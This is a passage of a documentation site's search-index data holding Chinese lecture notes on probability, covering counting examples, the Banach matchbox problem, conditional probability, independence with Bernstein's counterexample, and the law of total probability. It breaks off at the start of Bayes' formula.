<p>\u200b\u5728\u200b\u5229\u7528\u200b\u8be5\u5f0f\u200b\u8ba1\u7b97\u200b\u6982\u7387\u200b\u65f6\u200b\uff0c\u200b\u4e3b\u8981\u200b\u7684\u200b\u56f0\u96be\u200b\u662f\u200b\u786e\u5b9a\u200b\u4e8b\u4ef6\u200b\u4e2d\u200b\u5305\u542b\u200b\u57fa\u672c\u200b\u4e8b\u4ef6\u200b\u7684\u200b\u6570\u91cf\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u5229\u7528\u200b\u6392\u5217\u7ec4\u5408\u200b\u7684\u200b\u516c\u5f0f\u200b\u3002\u200b\u6392\u5217\u200b\u548c\u200b\u7ec4\u5408\u200b\u7ed9\u51fa\u200b\u4e86\u200b\u4e24\u79cd\u200b\u7ecf\u5178\u200b\u7684\u200b\u8ba1\u6570\u95ee\u9898\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u66f4\u200b\u590d\u6742\u200b\u7684\u200b\u8ba1\u6570\u95ee\u9898\u200b\u5f80\u5f80\u200b\u53ef\u4ee5\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u8fd9\u200b\u4e24\u7c7b\u200b\u95ee\u9898\u200b.</p> <p>\u200b\u4f8b\u9898\u200b 1.1</p> <p>\u200b\u4ece\u76db\u200b\u6709\u200b\u53f7\u7801\u200b\u4e3a\u200b \\(1,\\cdots, N\\) \u200b\u7684\u200b\u7403\u200b\u7684\u200b\u7bb1\u5b50\u200b\u91cc\u200b\u6709\u200b\u653e\u200b\u56de\u5730\u200b\u62bd\u53d6\u200b\u4e86\u200b \\(n\\) \u200b\u6b21\u200b (\u200b\u6bcf\u6b21\u200b\u53d6\u200b\u4e00\u4e2a\u200b\u7403\u200b, \u200b\u8bb0\u4e0b\u200b\u53f7\u7801\u200b\u540e\u653e\u56de\u200b\u7bb1\u5b50\u200b\u91cc\u200b), \u200b\u8bd5\u6c42\u200b\u8fd9\u4e9b\u200b\u53f7\u7801\u200b\u6309\u200b\u4e0d\u200b\u51cf\u5c0f\u200b\u7684\u200b\u6b21\u5e8f\u200b\u51fa\u73b0\u200b\u7684\u200b\u6982\u7387\u200b.</p> <p>\u200b\u89e3\u200b: \u200b\u95ee\u9898\u200b\u7684\u200b\u5173\u952e\u200b\u662f\u200b\u6240\u6709\u200b\u4e0d\u200b\u51cf\u5c0f\u200b\u7684\u200b\u5e8f\u5217\u200b \\((i_1,i_2,\\cdots,i_n)(1\\leq i_1\\leq i_2 \\leq \\cdots \\leq N)\\) \u200b\u6709\u200b\u591a\u5c11\u200b\u4e2a\u200b.</p> <p>\u200b\u8bbe\u200b \\(j_k=i_k+k-1 \\ (k=1,\\cdots, n)\\), \u200b\u5219\u200b \\((j_1,j_2,\\cdots,j_n)\\) \u200b\u662f\u200b\u7531\u200b \\(1,\\cdots,N+n-1\\) \u200b\u4e2d\u200b\u7684\u200b\u6570\u200b\u7ec4\u6210\u200b\u7684\u200b\u4e25\u683c\u200b\u589e\u5927\u200b\u5e8f\u5217\u200b, \u200b\u53ef\u4ee5\u200b\u8bc1\u660e\u200b\u8fd9\u6837\u200b\u7684\u200b\u6620\u5c04\u200b\u662f\u200b\u4e00\u4e2a\u53cc\u200b\u5c04\u200b.</p> <p>\u200b\u6240\u4ee5\u200b\u95ee\u9898\u200b\u53d8\u4e3a\u200b\u6c42\u200b \\(1,\\cdots,N+n-1\\) \u200b\u4e2d\u200b\u7684\u200b \\(n\\) \u200b\u4e2a\u6570\u200b\u7ec4\u6210\u200b\u7684\u200b\u4e25\u683c\u200b\u589e\u5927\u200b\u5e8f\u5217\u200b\u6570\u91cf\u200b, \u200b\u663e\u7136\u200b\u7b54\u6848\u200b\u4e3a\u200b\u4ece\u200b \\(N+n-1\\) \u200b\u4e2a\u6570\u200b\u4e2d\u53d6\u200b \\(n\\) \u200b\u4e2a\u6570\u200b\u7684\u200b\u65b9\u6848\u200b\u6570\u200b \\(C_{N+n-1}^{n}\\)</p> <p>\u200b\u603b\u5171\u200b\u62bd\u53d6\u200b\u7684\u200b\u65b9\u6848\u200b\u6570\u4e3a\u200b \\(N^n\\), \u200b\u6545\u200b\u6700\u540e\u200b\u7b54\u6848\u200b\u4e3a\u200b \\(\\frac{C_{N+n-1}^{n}}{N^n}\\) </p> <p>\u200b\u4f8b\u9898\u200b 1.2 (\u200b\u5df4\u62ff\u8d6b\u200b\u95ee\u9898\u200b)</p> <p>\u200b\u67d0\u200b\u6570\u5b66\u5bb6\u200b\u6709\u200b\u4e24\u76d2\u200b\u706b\u67f4\u200b, \u200b\u6bcf\u76d2\u200b\u6709\u200b \\(n\\) \u200b\u6839\u200b, \u200b\u6bcf\u6b21\u200b\u4f7f\u7528\u200b\u65f6\u200b, \u200b\u4ed6\u200b\u4efb\u53d6\u200b\u4e00\u76d2\u200b\u5e76\u200b\u4ece\u4e2d\u200b\u62bd\u51fa\u200b\u4e00\u6839\u200b. \u200b\u95ee\u200b\u4ed6\u200b\u53d1\u73b0\u200b\u4e00\u76d2\u200b\u7a7a\u800c\u200b\u540c\u65f6\u200b\u53e6\u200b\u4e00\u76d2\u200b\u8fd8\u6709\u200b \\(r(0 \\leqslant r \\leqslant n)\\) \u200b\u6839\u200b\u706b\u67f4\u200b\u7684\u200b\u6982\u7387\u200b\u4e3a\u200b\u591a\u5c11\u200b (\u200b\u53d1\u73b0\u200b\u4e3a\u7a7a\u200b\u8868\u793a\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u62bd\u5230\u200b\u7a7a\u76d2\u200b)?</p> <p>\u200b\u89e3\u200b. \u200b\u8bbe\u200b\u4e24\u76d2\u200b\u706b\u67f4\u200b\u5206\u522b\u200b\u4e3a\u200b \\(A, B\\), \u200b\u7531\u200b\u5bf9\u79f0\u6027\u200b, \u200b\u6240\u6c42\u200b\u6982\u7387\u200b\u4e3a\u200b\u4e8b\u4ef6\u200b \\(E =\\) \"\u200b\u53d1\u73b0\u200b \\(A\\) \u200b\u76d2\u7a7a\u200b\u800c\u200b \\(B\\) \u200b\u76d2\u200b\u8fd8\u6709\u200b \\(r\\) \u200b\u6839\u200b\" \u200b\u7684\u200b\u6982\u7387\u200b\u7684\u200b \\(2\\) \u200b\u500d\u200b. \u200b\u5148\u200b\u8ba1\u7b97\u200b\u6837\u672c\u7a7a\u95f4\u200b\u4e2d\u200b\u7684\u200b\u6837\u672c\u200b\u70b9\u200b\u4e2a\u6570\u200b. \u200b\u7531\u4e8e\u200b\u5171\u53d6\u200b\u4e86\u200b \\(2n - r + 1\\) \u200b\u6b21\u200b, \u200b\u6545\u6709\u200b \\(2^{2n-r+1}\\) \u200b\u4e2a\u200b\u6837\u672c\u200b\u70b9\u200b. \u200b\u8003\u5bdf\u200b\u4e8b\u4ef6\u200b \\(E\\), \u200b\u7b49\u6548\u200b\u4e3a\u200b\u524d\u200b \\(2n - r\\) \u200b\u6b21\u200b \\(A\\) \u200b\u76d2\u200b\u6070\u597d\u200b\u53d6\u200b \\(n\\) \u200b\u6b21\u200b, \u200b\u6b21\u5e8f\u200b\u4e0d\u8bba\u200b, \u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u5fc5\u5b9a\u200b\u53d6\u200b\u5230\u200b \\(A\\) \u200b\u76d2\u200b. \u200b\u6b64\u79cd\u200b\u6837\u672c\u200b\u70b9\u200b\u5171\u6709\u200b \\(C_{2n-r}^n\\) \u200b\u4e2a\u200b, \u200b\u56e0\u6b64\u200b</p> \\[P(E) = \\frac{C_{2n-r}^n}{2^{2n-r+1}}.\\] <p>\u200b\u6240\u6c42\u200b\u6982\u7387\u200b\u4e3a\u200b \\(\\frac{C_{2n-r}^n}{2^{2n-r}}\\).</p> <p>\\(2^{2n-r+1}\\) \u200b\u79cd\u200b\u53ef\u80fd\u200b\u4e2d\u200b, \u200b\u4e0d\u662f\u200b\u6709\u200b\u591a\u6b21\u200b\u62bd\u53d6\u200b\u5df2\u7ecf\u200b\u7a7a\u200b\u4e86\u200b\u7684\u200b\u706b\u67f4\u76d2\u200b\u7684\u200b\u53ef\u80fd\u200b\u5417\u200b? \u200b\u8fd9\u79cd\u200b\u53ef\u80fd\u6027\u200b\u662f\u200b\u5408\u6cd5\u200b\u7684\u200b\u5417\u200b?</p> <p>\u200b\u8fd9\u4e2a\u200b\u7591\u95ee\u200b\u4e3b\u8981\u200b\u662f\u56e0\u4e3a\u200b\u9898\u76ee\u200b\u5e76\u200b\u6ca1\u6709\u200b\u8bf4\u660e\u200b\u5f53\u200b\u53d1\u73b0\u200b\u4e00\u76d2\u200b\u706b\u67f4\u200b\u5df2\u7ecf\u200b\u7a7a\u200b\u4e86\u200b\u4e4b\u540e\u200b\u5e94\u8be5\u200b\u7ec8\u6b62\u200b\u8fd8\u662f\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u62bd\u200b, \u200b\u5982\u679c\u200b\u5141\u8bb8\u200b\u7ee7\u7eed\u200b\u62bd\u200b\u7684\u8bdd\u200b, \u200b\u8fd9\u4e2a\u200b\u7b54\u6848\u200b\u663e\u7136\u200b\u662f\u200b\u6b63\u786e\u200b\u7684\u200b. \u200b\u4f46\u662f\u200b\u5176\u5b9e\u200b\u5bf9\u4e8e\u200b\"\u200b\u53d1\u73b0\u200b\u67d0\u76d2\u200b\u706b\u67f4\u200b\u7a7a\u200b\u4e86\u200b\u5e94\u8be5\u200b\u7ec8\u6b62\u200b\"\u200b\u7684\u200b\u60c5\u51b5\u200b, \u200b\u7ed3\u679c\u200b\u4e5f\u200b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b. \u200b\u6211\u4eec\u200b\u53ea\u200b\u9700\u8981\u200b\u5c06\u200b\u6240\u6709\u200b\"\u200b\u53d1\u73b0\u200b\u7a7a\u200b\u4e86\u200b\u4e4b\u540e\u200b\u7ee7\u7eed\u200b\u62bd\u200b\"\u200b\u7684\u200b\u60c5\u51b5\u200b\u5f53\u4f5c\u200b\u7ec8\u6b62\u200b\u540e\u200b\u7684\u200b\u5206\u652f\u200b\u60c5\u51b5\u200b, \u200b\u5c06\u200b\u5b83\u4eec\u200b\u7d2f\u52a0\u200b\u8d77\u6765\u200b\u5373\u53ef\u200b.  </p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2001%20%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#15","title":"1.5 \u200b\u6761\u4ef6\u200b\u6982\u7387\u200b\u4e0e\u200b\u72ec\u7acb\u6027","text":"<p>\u200b\u5230\u200b\u73b0\u5728\u200b\u8ba8\u8bba\u200b\u7684\u200b\u6982\u7387\u200b\u90fd\u200b\u662f\u200b\u76f8\u5bf9\u200b\u4e8e\u200b\u67d0\u200b\u4e00\u200b\u786e\u5b9a\u200b\u7684\u200b\u6761\u4ef6\u200b \\(S\\), \u200b\u6211\u4eec\u200b\u540c\u6837\u200b\u53ef\u4ee5\u200b\u5728\u200b \\(S\\) \u200b\u4e4b\u5916\u200b\u9644\u52a0\u200b\u65b0\u200b\u7684\u200b\u6761\u4ef6\u200b. \u200b\u66f4\u200b\u786e\u5207\u7684\u8bf4\u200b, \u200b\u8bbe\u200b \\(A\\) \u200b\u548c\u200b \\(B\\) \u200b\u90fd\u200b\u662f\u200b\u6761\u4ef6\u200b \\(S\\) \u200b\u4e0b\u200b\u7684\u200b\u4e8b\u4ef6\u200b, \u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u7814\u7a76\u200b\u5728\u200b \\(B\\) \u200b\u53d1\u751f\u200b\u7684\u200b\u6761\u4ef6\u200b\u4e0b\u200b, \u200b\u4e8b\u4ef6\u200b \\(A\\) \u200b\u53d1\u751f\u200b\u7684\u200b\u6982\u7387\u200b, \u200b\u8bb0\u200b\u4f5c\u200b \\(P(A|B)\\). \u200b\u548c\u200b \u200b\u5b9a\u4e49\u200b1.4 \u200b\u4e00\u6837\u200b, \u200b\u4e0d\u65ad\u200b\u8fdb\u884c\u200b\u5b9e\u9a8c\u200b\u5e76\u200b\u5c06\u200b\u9891\u7387\u200b \\(\\mu_B/n_B\\) \u200b\u7684\u200b \"\u200b\u6781\u9650\u200b\" \u200b\u5b9a\u4e49\u200b\u4e3a\u200b\u6982\u7387\u200b. \u200b\u4e0d\u8fc7\u200b\u4e0d\u540c\u200b\u7684\u200b\u662f\u200b\u8fd9\u91cc\u200b\u7684\u200b \\(\\mu_B\\) \u200b\u4ee3\u8868\u200b \\(A\\) \u200b\u548c\u200b \\(B\\) \u200b\u540c\u65f6\u200b\u53d1\u751f\u200b\u7684\u200b\u6b21\u6570\u200b, \u200b\u800c\u200b \\(n_B\\) \u200b\u662f\u200b\u6761\u4ef6\u200b \\(B\\) \u200b\u53d1\u751f\u200b\u7684\u200b\u6b21\u6570\u200b (\u200b\u5373\u200b\u5ffd\u7565\u200b\u6761\u4ef6\u200b \\(B\\) \u200b\u6ca1\u6709\u200b\u53d1\u751f\u200b\u7684\u200b\u60c5\u51b5\u200b). \u200b\u5728\u200b\u5206\u5b50\u200b\u5206\u6bcd\u200b\u4e0a\u200b\u540c\u65f6\u200b\u9664\u4ee5\u200b\u603b\u200b\u5b9e\u9a8c\u200b\u6b21\u6570\u200b \\(n\\), \u200b\u5f97\u5230\u200b\u6761\u4ef6\u200b\u6982\u7387\u200b</p> \\[P(A|B) \\approx \\frac{\\mu_B/n}{n_B/n} \\approx \\frac{P(AB)}{P(B)},\\] <p>\u200b\u8fd9\u91cc\u200b \\(\\approx\\) \u200b\u8868\u793a\u200b\u5f53\u200b\u5b9e\u9a8c\u200b\u6b21\u6570\u200b\u8db3\u591f\u200b\u5927\u65f6\u200b\u5728\u200b\u6982\u7387\u200b\u503c\u200b\u7684\u200b\u9644\u8fd1\u200b\u6446\u52a8\u200b. \u200b\u4e3a\u4e86\u200b\u6570\u5b66\u200b\u4e0a\u200b\u7684\u200b\u4e25\u8c28\u6027\u200b, \u200b\u6211\u4eec\u200b\u91c7\u7528\u200b\u5982\u4e0b\u200b\u7684\u200b\u5b9a\u4e49\u200b.</p> <p>\u200b\u5b9a\u4e49\u200b 1.9 \u200b\u6761\u4ef6\u200b\u6982\u7387\u200b</p> <p>\u200b\u8bbe\u200b \\((\\Omega, \\mathcal{F}, P)\\) \u200b\u4e3a\u200b\u6982\u7387\u200b\u7a7a\u95f4\u200b, \u200b\u4e8b\u4ef6\u200b \\(A, B \\in \\mathcal{F}\\) \u200b\u6ee1\u8db3\u200b \\(P(B) &gt; 0\\). \u200b\u79f0\u200b</p> \\[P(A|B) = \\frac{P(AB)}{P(B)}\\] <p>\u200b\u4e3a\u200b \\(B\\) \u200b\u53d1\u751f\u200b\u6761\u4ef6\u200b\u4e0b\u200b \\(A\\) \u200b\u53d1\u751f\u200b\u7684\u200b\u6761\u4ef6\u200b\u6982\u7387\u200b.</p> <p>\u200b\u6761\u4ef6\u200b\u6982\u7387\u200b \\(P(\\cdot|B)\\) \u200b\u4e3a\u200b \\((\\Omega, \\mathcal{F})\\) \u200b\u4e0a\u200b\u7684\u200b\u6982\u7387\u200b, \u200b\u5373\u200b\u6ee1\u8db3\u200b \u200b\u5b9a\u4e49\u200b1.7 :</p> <p>(1) \u200b\u5bf9\u200b\u4efb\u610f\u200b\u4e8b\u4ef6\u200b \\(A \\in \\mathcal{F}\\), \u200b\u6709\u200b \\(P(A|B) \\geqslant 0\\);</p> <p>(2) \\(P(\\Omega|B) = 1\\);</p> <p>(3) \u200b\u5bf9\u200b\u4efb\u610f\u200b\u4e24\u200b\u4e24\u200b\u4e0d\u200b\u76f8\u4ea4\u200b\u7684\u200b\u4e8b\u4ef6\u200b\u5e8f\u5217\u200b \\(\\{A_n\\}_{n=1}^{\\infty} \\subset \\mathcal{F}\\), \u200b\u6709\u200b</p> \\[P\\left(\\bigcup_{n=1}^{\\infty} A_n \\,\\bigg|\\, B\\right) = \\sum_{n=1}^{\\infty} P(A_n|B).\\] <p>\u200b\u7531\u200b\u6761\u4ef6\u200b\u6982\u7387\u200b\u7684\u200b\u5b9a\u4e49\u200b, \u200b\u5bb9\u6613\u200b\u5f97\u5230\u200b, \\(P(B|\\Omega) = P(B)\\). \u200b\u5c06\u200b\u6761\u4ef6\u200b\u6982\u7387\u200b\u7684\u200b\u5b9a\u4e49\u200b\u6539\u5199\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u4e58\u6cd5\u200b\u516c\u5f0f\u200b:</p> \\[P(AB) = P(B|A)P(A).\\] <p>\u200b\u5bf9\u4e8e\u200b \\(n\\) \u200b\u4e2a\u200b\u4e8b\u4ef6\u200b, \u200b\u53ef\u4ee5\u200b\u5f52\u7eb3\u200b\u5f97\u5230\u200b\u4e58\u6cd5\u200b\u516c\u5f0f\u200b\u7684\u200b\u63a8\u5e7f\u200b:</p> \\[P(A_1A_2 \\cdots A_n) = P(A_1)P(A_2|A_1)P(A_3|A_1A_2) \\cdots P(A_n|A_1A_2 \\cdots A_{n-1}),\\] <p>\u200b\u72ec\u7acb\u6027\u200b\u662f\u200b\u4e0e\u200b\u6761\u4ef6\u200b\u6982\u7387\u200b\u5bc6\u5207\u76f8\u5173\u200b\u7684\u200b\u6982\u7387\u200b. \u200b\u76f4\u89c9\u200b\u4e0a\u200b\u8bf4\u200b, \u200b\u4e8b\u4ef6\u200b \\(A\\) \u200b\u548c\u200b \\(B\\) \u200b\u72ec\u7acb\u200b\u662f\u200b\u8bf4\u200b \\(A\\) \u200b\u7684\u200b\u53d1\u751f\u200b\u4e0e\u5426\u200b\u4e0d\u200b\u5f71\u54cd\u200b \\(B\\) \u200b\u7684\u200b\u53d1\u751f\u200b\u4e0e\u5426\u200b, \u200b\u53cd\u4e4b\u4ea6\u7136\u200b. \u200b\u7528\u200b\u6982\u7387\u200b\u7684\u200b\u8bed\u8a00\u200b\u8bf4\u200b, \u200b\u5c31\u662f\u200b \\(P(A) = P(A|B)\\) \u200b\u4e14\u200b \\(P(B) = P(B|A)\\), \u200b\u7531\u200b\u6761\u4ef6\u200b\u6982\u7387\u200b\u7684\u200b\u5b9a\u4e49\u200b\u5bb9\u6613\u200b\u9a8c\u8bc1\u200b\u4e8c\u8005\u200b\u662f\u200b\u7b49\u4ef7\u200b\u7684\u200b, \u200b\u4e14\u200b\u90fd\u200b\u7b49\u4ef7\u200b\u4e8e\u200b\u4e0b\u9762\u200b\u7684\u200b\u5b9a\u4e49\u200b.</p> <p>\u200b\u5b9a\u4e49\u200b 1.10 \u200b\u72ec\u7acb\u200b\u4e8b\u4ef6\u200b</p> <p>\u200b\u8bbe\u200b \\((\\Omega, \\mathcal{F}, P)\\) \u200b\u4e3a\u200b\u6982\u7387\u200b\u7a7a\u95f4\u200b, \u200b\u5982\u679c\u200b\u4e8b\u4ef6\u200b \\(A, B \\in \\mathcal{F}\\) \u200b\u6ee1\u8db3\u200b</p> \\[P(AB) = P(A)P(B),\\] <p>\u200b\u5219\u200b\u79f0\u200b\u4e8b\u4ef6\u200b \\(A\\) \u200b\u548c\u200b \\(B\\) \u200b\u76f8\u4e92\u200b\u72ec\u7acb\u200b (\u200b\u7b80\u79f0\u200b\u72ec\u7acb\u200b).</p> <p>\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e8b\u4ef6\u200b\u7684\u200b\u72ec\u7acb\u6027\u200b\u4e4b\u540e\u200b, \u200b\u63a5\u4e0b\u6765\u200b\u8ba8\u8bba\u200b\u72ec\u7acb\u200b\u4e8b\u4ef6\u200b\u7684\u200b\u6027\u8d28\u200b:</p> <p>\u200b\u72ec\u7acb\u200b\u4e8b\u4ef6\u200b\u7684\u200b\u6027\u8d28\u200b</p> <p>\u200b\u72ec\u7acb\u200b\u4e8b\u4ef6\u200b\u6709\u200b\u5982\u4e0b\u200b\u6027\u8d28\u200b:</p> <p>\\((1)\\) \u200b\u82e5\u200b \\(A, B\\) \u200b\u72ec\u7acb\u200b, \u200b\u4e14\u200b \\(P(B) &gt; 0\\), \u200b\u5219\u200b</p> \\[P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(A)P(B)}{P(B)} = P(A).\\] <p>\\((2)\\) \u200b\u82e5\u200b \\(A, B\\) \u200b\u72ec\u7acb\u200b, \u200b\u5219\u200b \\(A\\) \u200b\u4e0e\u200b \\(\\overline{B}\\), \\(\\overline{A}\\) \u200b\u4e0e\u200b \\(B\\), \\(\\overline{A}\\) \u200b\u4e0e\u200b \\(\\overline{B}\\) \u200b\u4ea6\u200b\u72ec\u7acb\u200b.</p> <p>\\((3)\\) \u200b\u96f6\u200b\u6982\u7387\u200b\u4e8b\u4ef6\u200b\u53ca\u5176\u200b\u5bf9\u7acb\u200b\u7684\u200b\u4e8b\u4ef6\u200b\u4e0e\u200b\u4efb\u610f\u200b\u7684\u200b\u4e8b\u4ef6\u200b\u90fd\u200b\u72ec\u7acb\u200b. \u200b\u5373\u200b\u6761\u4ef6\u200b\u6982\u7387\u200b\u7b49\u4e8e\u200b\u65e0\u6761\u4ef6\u200b\u6982\u7387\u200b.</p> <p>\u200b\u8bc1\u660e\u200b:</p> <p>\u200b\u8fd9\u91cc\u200b\u4e3b\u8981\u200b\u8bc1\u660e\u200b\u6027\u8d28\u200b (2).</p> <p>\u200b\u7531\u4e8e\u200b \\(A,B\\) \u200b\u72ec\u7acb\u200b, \u200b\u6709\u200b \\(P(AB)=P(A)P(B)\\).</p> <p>\u200b\u6ce8\u610f\u200b\u5230\u200b \\(A=AB\\cup A\\overline{B}\\), \u200b\u4e14\u200b \\(AB,A\\overline{B}\\) \u200b\u4e92\u65a5\u200b. \u200b\u6545\u200b \\(P(AB)+P(A\\overline{B})=P(A)\\).</p> <p>\u200b\u6240\u4ee5\u200b \\(P(A\\overline{B})=P(A)-P(A)P(B)=P(A)(1-P(B))=P(A)P(\\overline{B})\\).</p> <p>\u200b\u5176\u4ed6\u200b\u60c5\u51b5\u200b\u7c7b\u4f3c\u200b\u53ef\u8bc1\u200b, \u200b\u5229\u7528\u200b\u6570\u5b66\u200b\u5f52\u7eb3\u6cd5\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u63a8\u5e7f\u200b\u5230\u200b \\(n\\) \u200b\u4e2a\u200b\u4e8b\u4ef6\u200b\u76f8\u4e92\u200b\u72ec\u7acb\u200b\u7684\u200b\u60c5\u5f62\u200b.</p> <p>\u200b\u5b9a\u4e49\u200b 1.11 \u200b\u591a\u4e2a\u200b\u4e8b\u4ef6\u200b\u7684\u200b\u76f8\u4e92\u200b\u72ec\u7acb\u200b</p> <p>\u200b\u8bbe\u200b \\(\\{A_k\\}_{k\\leqslant n} \\subset \\mathcal{F}\\). \u200b\u5982\u679c\u200b\u5bf9\u200b\u4efb\u610f\u200b\u7684\u200b \\(k \\leqslant n\\) \u200b\u548c\u200b \\(1 \\leqslant i_1 &lt; i_2 &lt; \\cdots &lt; i_k \\leqslant n\\), \u200b\u90fd\u200b\u6709\u200b</p> \\[P\\left(\\bigcap_{j=1}^{k} A_{i_j}\\right) = \\prod_{j=1}^{k} P(A_{i_j}),\\] <p>\u200b\u5219\u200b\u79f0\u200b \\(A_1, A_2, \\cdots, A_n\\) \u200b\u76f8\u4e92\u200b\u72ec\u7acb\u200b (\u200b\u7b80\u79f0\u200b\u72ec\u7acb\u200b).</p> <p>Warning</p> <p>\u200b\u82e5\u200b \\(n\\) \u200b\u4e2a\u200b\u4e8b\u4ef6\u200b\u76f8\u4e92\u200b\u72ec\u7acb\u200b, \u200b\u5219\u200b\u5b83\u4eec\u200b\u4e24\u200b\u4e24\u200b\u72ec\u7acb\u200b, \u200b\u4f46\u662f\u200b\u53cd\u4e4b\u200b\u4e0d\u200b\u6210\u7acb\u200b.</p> <p>\u200b\u4f2f\u6069\u65af\u5766\u200b\u53cd\u4f8b\u200b</p> <p>\u200b\u4e00\u4e2a\u200b\u5747\u5300\u200b\u7684\u200b\u6b63\u56db\u9762\u4f53\u200b, \u200b\u5176\u200b\u7b2c\u4e00\u200b\u3001\u200b\u4e8c\u200b\u3001\u200b\u4e09\u9762\u200b\u5206\u522b\u200b\u6d82\u4e0a\u200b\u7ea2\u200b\u3001\u200b\u9ec4\u200b\u3001\u200b\u84dd\u200b\u4e09\u79cd\u200b\u989c\u8272\u200b\u7b2c\u56db\u200b\u9762\u200b\u540c\u65f6\u200b\u6d82\u4e0a\u200b\u4ee5\u4e0a\u200b\u4e09\u79cd\u200b\u989c\u8272\u200b. \u200b\u4ee5\u200b \\(A, B, C\\) \u200b\u5206\u522b\u200b\u8868\u793a\u200b\u6295\u200b\u4e00\u6b21\u200b\u56db\u9762\u4f53\u200b\u51fa\u73b0\u200b\u7ea2\u200b\u3001\u200b\u9ec4\u200b\u3001\u200b\u84dd\u200b\u989c\u8272\u200b\u671d\u4e0b\u200b\u7684\u200b\u4e8b\u4ef6\u200b, \u200b\u5219\u200b</p> \\[P(A) = P(B) = P(C) = \\frac{1}{2}, \\quad P(AB) = P(BC) = P(AC) = \\frac{1}{4}.\\] <p>\u200b\u4ece\u800c\u200b \\(A, B, C\\) \u200b\u4e24\u200b\u4e24\u200b\u72ec\u7acb\u200b, \u200b\u4f46\u662f\u200b</p> \\[P(ABC) = \\frac{1}{4} \\neq P(A)P(B)P(C).\\] <p>\u200b\u5229\u7528\u200b \\(n\\) \u200b\u4e2a\u200b\u4e8b\u4ef6\u200b\u7684\u200b\u76f8\u4e92\u200b\u72ec\u7acb\u200b, \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u5982\u4e0b\u200b\u8ba1\u7b97\u516c\u5f0f\u200b:</p> <p>\u200b\u5b9a\u7406\u200b 1.1 \u200b\u72ec\u7acb\u6027\u200b\u4e0e\u200b\u6982\u7387\u200b\u8ba1\u7b97\u200b</p> <p>\u200b\u8bbe\u200b \\(A_1,A_2,\\cdots,A_n\\) \u200b\u76f8\u4e92\u200b\u72ec\u7acb\u200b, \u200b\u5219\u200b</p> \\[ P(A_1\\cup A_2 \\cup \\cdots \\cup A_n) = 1 - \\prod_{i=1}^{n}P(\\overline{A_i}). \\] <p>\u200b\u8bc1\u660e\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b De Morgan's laws \u200b\u548c\u200b\u4e4b\u524d\u200b\u63d0\u5230\u200b\u7684\u200b \\(n\\) \u200b\u4e2a\u200b\u4e8b\u4ef6\u200b\u76f8\u4e92\u200b\u72ec\u7acb\u200b\u5219\u200b\u5b83\u4eec\u200b\u7684\u200b\u5bf9\u7acb\u200b\u4e8b\u4ef6\u200b\u4e5f\u200b\u76f8\u4e92\u200b\u72ec\u7acb\u200b\u7684\u200b\u6027\u8d28\u200b.</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2001%20%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#16","title":"1.6 \u200b\u5168\u200b\u6982\u7387\u200b\u516c\u5f0f\u200b\u548c\u200b\u8d1d\u53f6\u65af\u200b\u516c\u5f0f","text":"<p>\u200b\u5b9a\u4e49\u200b 1.12 (\u200b\u5b8c\u5907\u200b\u4e8b\u4ef6\u200b\u7ec4\u200b)</p> <p>\u200b\u82e5\u200b \\(\\{B_n\\}_{n\\geq1} \\subset \\mathcal{F}\\) \u200b\u6ee1\u8db3\u200b\u4e24\u200b\u4e24\u200b\u4e92\u65a5\u200b\u4e14\u200b \\(\\sum_{n=1}^{\\infty} B_n = \\Omega\\)\uff0c\u200b\u5219\u200b\u79f0\u200b \\(\\{B_n\\}_{n\\geq1}\\) \u200b\u4e3a\u200b\u5b8c\u5907\u200b\u4e8b\u4ef6\u200b\u7ec4\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u6c42\u200b\u51fa\u200b\u4e8b\u4ef6\u200b \\(A\\) \u200b\u7684\u200b\u6982\u7387\u200b\uff0c\u200b\u5728\u200b\u7ed9\u51fa\u200b\u4e86\u200b\u5fc5\u7136\u200b\u4e8b\u4ef6\u200b \\(\\Omega\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u5212\u5206\u200b \\(\\{B_n\\}_{n\\geq1}\\) \u200b\u540e\u200b\uff0c\u200b\u9700\u8981\u200b\u6c42\u89e3\u200b\u6bcf\u79cd\u200b\u60c5\u51b5\u200b\u7684\u200b\u6982\u7387\u200b \\(P(AB_n) = P(B_n)P(A|B_n)\\)\u3002\u200b\u6700\u7ec8\u200b\u7684\u200b\u7ed3\u679c\u200b\u53ef\u4ee5\u200b\u7528\u200b\u5982\u4e0b\u200b\u7684\u200b\u516c\u5f0f\u200b\u6c42\u89e3\u200b\u3002</p> <p>\u200b\u5b9a\u7406\u200b 1.2 \u200b\u5168\u200b\u6982\u7387\u200b\u516c\u5f0f\u200b</p> <p>\u200b\u8bbe\u200b \\(\\{B_n\\}_{n\\geq1}\\) \u200b\u4e3a\u200b\u5b8c\u5907\u200b\u4e8b\u4ef6\u200b\u7ec4\u200b\uff0c\u200b\u5219\u200b\u5bf9\u200b\u4efb\u610f\u200b\u4e8b\u4ef6\u200b \\(A\\) \u200b\u90fd\u200b\u6709\u200b</p> \\[P(A) = \\sum_{n=1}^{\\infty} P(B_n)P(A|B_n).\\] <p>\u200b\u5b9a\u7406\u200b 1.3 \u200b\u8d1d\u53f6\u65af\u200b\u516c\u5f0f\u200b</p> <p>\u200b\u8bbe\u200b \\(\\{B_n\\}_{n\\geq1}\\) \u200b\u4e3a\u200b\u5b8c\u5907\u200b\u4e8b\u4ef6\u200b\u7ec4\u200b\uff0c\\(A \\in \\mathcal{F}\\) \u200b\u6ee1\u8db3\u200b \\(P(A) &gt; 